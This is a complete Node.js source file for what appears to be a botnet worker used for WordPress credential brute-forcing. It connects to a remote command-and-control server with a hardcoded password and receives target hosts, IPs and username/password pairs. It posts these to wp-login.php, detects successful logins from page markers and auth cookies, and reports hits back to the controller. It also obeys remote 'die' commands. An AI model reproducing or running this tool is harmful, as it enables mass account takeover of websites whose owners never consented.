'use strict';

let assert = require('assert');
let net = require('net');
let fs = require('fs');
let path = require('path');
let http = require('http');
let https = require('https');
let URL = require('url');
let querystring = require('querystring');

let nErrs = 0;
let nOK = 0;

setInterval(() => {
//  console.log('%d total, %d errors', nOK, nErrs);
}, 1000);
let server;
function logToFile(str) {
  console.log(str);
  try {
    fs.appendFileSync('err.log', str + '\r\n');
  } catch(e) {
    console.log(e);
  }
}


process.on('uncaughtException', function(err) {
  console.log('Uncaught exception');
  let str = new Error().stack.toString();
  str += ' \n\r ';
  str += err.toString() + ' \n\r ';
  str += err.stack.toString();
  str += '\n---------------------------------\n\r';
  console.log(str);
  try {
    fs.appendFileSync('err.log', str + ' \n\r ');
  } catch (e) {
    console.log('WTF');
  }
  server.sendDebugMsg({
    err: err,
    stack: err.stack.toString(),
    str: str
  });
  console.log('uncaught happened. exiting');
  process.exit(0);
});

let config = {
  sentinel: '\0',
  pass : 'AhhkAX0w4ZPwkg4Z4FjV',
  timeout: 2.1 * 60 * 1000
};

config.host = process.argv[3];
config.port = process.argv[4];
config.botID = process.argv[2];
if (process.argv.length > 5) {
  config.dnsWorks = process.argv[5];
  assert(config.dnsWorks.toString() === 'true'
	|| config.dnsWorks.toString() === 'false');
  if (config.dnsWorks.toString() === 'true') {
    config.dnsWorks = true;
  } else {
    config.dnsWorks = false;
  }
} else {
  config.dnsWorks = false;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}


class Connection {
  constructor(sock, onMsg, onClose) {
    if (!sock.remoteAddress) {
      return;
    }
    sock.on('close', () => {
      onClose();
    });
    sock.on('error', err => {
      
    });
    sock.on('end', () => {
      sock.end();
    });
    sock.on('data', data => {
      this._onData.call(this, data);
    });

    this._onMsg = onMsg;

    this._sock = sock;
    this._recData = '';
    this._ip = sock.remoteAddress;
    this._alive = true;
  }

  _deleteAllMsgsFrom(recData) {
    let split = recData.lastIndexOf(config.sentinel);
    if (split === -1) {
      console.log('split err' + recData);
      logToFile('split err. ' + recData);
    }
    return recData.substring(split + 1);
  };

  _extractAllMsgsFrom(recData) {
    let arr = [];
    while (true) {
      let split = recData.indexOf(config.sentinel);
      if (split === -1) {
        break;
      }
      let msg = recData.substring(0, split);
      recData = recData.substring(split + 1);
      arr.push(msg);
    }
    return arr;
  };

  _onData(data) {
    this._recData += data;
    let msgs = this._extractAllMsgsFrom(this._recData);
    if (msgs.length === 0) {
      /* not fully received yet;*/
      return;
    }
    this._recData = this._deleteAllMsgsFrom(this._recData);
    for (let i = 0; i < msgs.length; i++) {
      let msg = msgs[i];
      console.log(msg);
      this._handleRawMsg(msg);
    }
  }
  
  _handleRawMsg(msg) {
    if (msg === '') {
      this.send('{}' + config.sentinel); // keep alive
      return;
    }
    let resp = null;
    try {
      let msgObj = JSON.parse(msg);
      resp = this._onMsg(msgObj);
    } catch (e) {
      logToFile('invalid msg');
      logToFile(msg);
    }
    if (resp) {
      this.sendMsg(resp);
    }
  }

  sendMsg(msg) {
    this._sock.write(JSON.stringify(msg) + config.sentinel);
  }

  send(str) {
    this._sock.write(str);
  }

  die() {
    this._sock.end();
    this._sock.destroy();
  }

}

class Server {
  constructor(ip, port, onMsg) {
    this._ip = ip;
    this._port = port;
    this._con = null;
    this._onMsg = onMsg;
    this._connect();
    this._nConnects = 0;
  }
  getNConnects() {
    return this._nConnects;
  }
  die() {
    this._onClose = function() {
      
    };
    if (this._con) {
      this._con.sendMsg({
	type: 'dying'
      });
      console.log('dying................');
      this._con.die();
    }
  }
  _onClose() {
    //console.log('server disconnected.exiting');
    //process.exit(0);
    this._con = null;
    setTimeout(() => {
      this._connect();
    });
    console.log('disconnected');
  }
  _onConnect() {
    this._nConnects++;
    this._con.sendMsg({
      type: 'pass',
      pass: config.pass,
      botID: config.botID,
      dnsWorks: config.dnsWorks
    });
  }

  sendDebugMsg(msg) {
    let resp = {
      type: 'debug',
      'msg': msg
    };
    this.sendMsg(resp);
  }
  sendMsg(msg) {
    if (!this._con) {
      return;
    }
    this._con.sendMsg(msg);
  }

  _connect() {
    if (this._con) {
      this._con.die();
      this._con = null;
    }
    let onCanNotConnect = function() {
      console.log('can not connect');
      setTimeout(() => {
	this._connect();
      }, 1000);
    }.bind(this);
    let socket = net.connect(this._port, this._ip, () => {
      socket.removeListener('close', onCanNotConnect);
      this._con = new Connection(socket, this._onMsg, this._onClose.bind(this));
      console.log('connected');
      this._onConnect();
      let timeout = config.timeout + getRandomInt(0, 1 * 60 * 1000);
      socket.setTimeout(timeout, () => {
        this.sendDebugMsg({
          msg: 'timeout happend. exiting'
        });
	this._con.die();
	console.log('timeout happened shit. exiting');
	process.exit(0);
      });
      socket.setKeepAlive(true, 60 * 1000);
    });
    
    socket.on('error', (err) => {
      console.log(err);
    });
    socket.on('close', onCanNotConnect);
    
  }
}

function formatHost(host) {
  let res = host;
  if (host.indexOf('http://') === 0) {
    res = host;
  } else if (host.indexOf('https://') === 0) {
    res = host;
  } else {
    res = 'http://' + host;
  }

  if (res[res.length - 1] === '/') {
    return res;
  } else {
    return res + '/';
  }
}

function isHttp(host) {
  if (host.indexOf('http://') === 0) {
    return true;
  }
  return false;
}
let HEADERS = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Encoding':'gzip, deflate', 'Accept-Language':'en-US,en;q=0.8,ka;q=0.6', 'Cache-Control':'max-age=0', 'Connection':'keep-alive', 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"};

//let HEADERS = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.8,ka;q=0.6', 'Cache-Control':'max-age=0', 'Connection':'keep-alive', 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"};

function sendLoginRequest(host, ip, user, pass, timeout, nTry, cb) {
  assert(nTry > 0);
  let getter = https;
  if (isHttp(host)) {
    getter = http; 
  }

  let url = host + 'wp-login.php';

  let parsedUrl = URL.parse(url);
  let postData = {
    'log' : user,
    'pwd' : pass,
    'wp-submit' : 'Log in',
    'redirect_to' : host + 'wp-admin/'
  };
  postData = querystring.stringify(postData);

  let port = 80;
  if (getter === https) {
    port = 443;
  };
  if (parsedUrl.port) {
    port = parsedUrl.port;
  }
  let options = {
//    hostname: parsedUrl.hostname,
    hostname: ip,
    port: port,
    path: parsedUrl.path,
    method: 'POST',
    headers: HEADERS
  };
  options.headers['Content-Length'] = postData.length;
  options.headers['Host'] = parsedUrl.hostname;
  let timeoutId;
  let response = null;
  
/*
  const s = net.connect('443', '185.125.4.214', () => {

  });
  s.on('error', err => {

  });
  return;
  return;
*/
  let req = getter.request(options, (res) => {
    let status = res.statusCode;
    res.setEncoding('utf8');
    response = res;
    let content = '';
    console.log('response received: %d', status);
    console.log(res.rawHeaders);
    res.on('data', chunk => {
      console.log('ondata');
      content += chunk;
    });
    res.on('end', () => {
      console.log('onend');
      clearTimeout(timeoutId);
      cb(null, status, res.rawHeaders, content);
      cb = function() {};
    });
  });

  req.on('error', (e) => {
    nTry--;
    if (nTry > 0) {
      sendLoginRequest(host, ip, user, pass, timeout, nTry, cb);
      return;
    }
    nErrs++;
    console.log('eminem');
    console.log(host);
    console.log(e);
    clearTimeout(timeoutId);
    cb(e);
    cb = function() {};
  });

  req.write(postData);
  req.end();

  timeoutId = setTimeout(() => {
    try {
      req.abort();
    } catch (e) {
    } 
    cb('timeout');
    cb = function() {};
  }, timeout);
  
}

function isLoggedIn(source) {
  if (source.indexOf('type="password"') !== -1) {
    return false;
  }
  if (source.indexOf("type='password'") !== -1) {
    return false;
  }
  // change
  if (source.indexOf('var ajaxurl = \'/wp/wp-admin/admin-ajax.php\'') !== -1) {
    return true;
  }
  return undefined;
}

function checkHost(host, ip, user, pass, timeout, msgId, server) {
  host = formatHost(host);
  let timeoutId = setTimeout(() => {
      let msg = {
	type: 'checkHost',
	id: msgId,
	err: 'timeout',
	success: false
      };
    server.sendMsg(msg);
    timeoutId = null;
  }, timeout);

  nOK++;
  sendLoginRequest(host, ip, user, pass, timeout, 1, (err, statusCode, headers, res) => {
    if (timeoutId === null) {
      return;			// already went timeout
    }
    clearTimeout(timeoutId);

    let result = null;
    if (err) {
      result = false;
    }
    if (statusCode >= 400) {
      result = false;
    }
    if (result !== false) {
      result = isLoggedIn(res);
    }
    console.log(result);
    if (result === undefined) {
      let parsedHeaders = '';
      for (let i = 0; i < headers.length; i++) {
	let header = headers[i];
	console.log(header);
	if (header.indexOf('Set-Cookie') !== -1) {
	  i++;
	  if (i >= headers.length) {
	    break;
	  }
	  header = headers[i].toLowerCase();
	  if (header.indexOf('path=/wp-content/plugins') !== -1) {
	    if (header.indexOf(user + '%7c') !== -1) {
	      result = true;
	    }
	    break;
	  }
	  
	}
      }
    }
    // result is either true or false or undefined
    if (err && err !== 'timeout') {
      err = err.errno;
    }
    let msg = {
      type: 'checkHost',
      id: msgId,
      err: err,
      success: result
    };
    server.sendMsg(msg);
  });
}


server = new Server(config.host, config.port, onMsg);

function onMsg(msg) {
  console.log(msg);
  if (msg.type === 'die') {
    console.log('dying');
    server.sendDebugMsg({
      msg: 'dying..'
    });

    process.exit(0);
  } else if (msg.type === 'checkHost') {
//    return;
//    http.get('http://' + msg.host, (res) => {
/*
    const dns = require('dns');
    dns.lookup(msg.host, (err, addresses, family) => {
      console.log('addresses:', addresses);
    });
*/

    checkHost(msg.host, msg.ip, msg.user, msg.pass, msg.timeout, msg.id, server);
    return;
    http.get('http://74.124.194.103', (res) => {
      console.log(`Got response: ${res.statusCode}`);
      // consume response body
      res.resume();
    }).on('error', (e) => {
      console.log(`Got error: ${e.message}`);
    });
    return;
  } else {
    let err = JSON.stringify(msg);
    console.log(msg);
    throw new Error('unknown msg' + err);
  }
}
